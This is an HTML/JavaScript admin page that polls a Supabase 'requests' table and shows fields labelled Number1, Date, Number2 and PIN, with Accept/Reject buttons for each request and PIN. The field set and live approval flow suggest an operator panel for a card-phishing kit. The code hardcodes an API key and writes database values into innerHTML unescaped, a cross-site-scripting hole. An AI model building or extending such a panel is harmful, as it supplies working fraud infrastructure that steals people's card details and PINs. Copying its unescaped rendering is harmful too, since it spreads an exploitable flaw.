<!DOCTYPE html>
<html>
<head>

<title>Admin Panel</title>

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>

<style>

body{
    background:#111;
    color:white;
    font-family:Arial;
    padding:30px;
}

.card{
    background:#1b1b1b;
    padding:20px;
    margin-bottom:20px;
    border-radius:15px;
}

button{
    padding:10px 15px;
    border:none;
    border-radius:10px;
    margin-right:10px;
    cursor:pointer;
}

.accept{
    background:green;
    color:white;
}

.reject{
    background:red;
    color:white;
}

</style>

</head>
<body>

<h1>Admin Panel</h1>

<div id="data"></div>

<script>

const SUPABASE_URL = 'https://ijvtokyhuqrwndyfxzrn.supabase.co/rest/v1/';
const SUPABASE_KEY = 'sb_publishable_I6WAJg-zdYfB95rbcm57rQ_iXpU0s52';

const client = supabase.createClient(
SUPABASE_URL,
SUPABASE_KEY
);


// LOAD DATA
async function loadData(){

    const { data } = await client
    .from('requests')
    .select('*')
    .order('id',{ascending:false});

    let html = '';

    data.forEach(row=>{

        html += `

        <div class="card">

        <h3>ID: ${row.id}</h3>

        <p>Number1: ${row.number1}</p>

        <p>Date: ${row.date_value}</p>

        <p>Number2: ${row.number2}</p>

        <p>Status: ${row.status}</p>

        `;

        // ACCEPT/REJECT
        if(row.status === 'pending'){

            html += `

            <button class="accept"
            onclick="acceptReq(${row.id})">
            Accept
            </button>

            <button class="reject"
            onclick="rejectReq(${row.id})">
            Reject
            </button>

            `;

        }

        // PIN
        if(row.pin){

            html += `

            <hr>

            <p>PIN: ${row.pin}</p>

            <p>PIN STATUS: ${row.pin_status}</p>

            `;

        }

        // PIN APPROVAL
        if(row.pin_status === 'pending'){

            html += `

            <button class="accept"
            onclick="acceptPin(${row.id})">
            Accept PIN
            </button>

            <button class="reject"
            onclick="rejectPin(${row.id})">
            Reject PIN
            </button>

            `;

        }

        html += `</div>`;

    });

    document.getElementById('data').innerHTML = html;

}

setInterval(loadData,2000);

loadData();


// ACCEPT
async function acceptReq(id){

    await client
    .from('requests')
    .update({
        status:'accepted'
    })
    .eq('id',id);

}


// REJECT
async function rejectReq(id){

    await client
    .from('requests')
    .update({
        status:'rejected'
    })
    .eq('id',id);

}


// ACCEPT PIN
async function acceptPin(id){

    await client
    .from('requests')
    .update({
        pin_status:'accepted'
    })
    .eq('id',id);

}


// REJECT PIN
async function rejectPin(id){

    await client
    .from('requests')
    .update({
        pin_status:'rejected'
    })
    .eq('id',id);

}

</script>

</body>
</html>
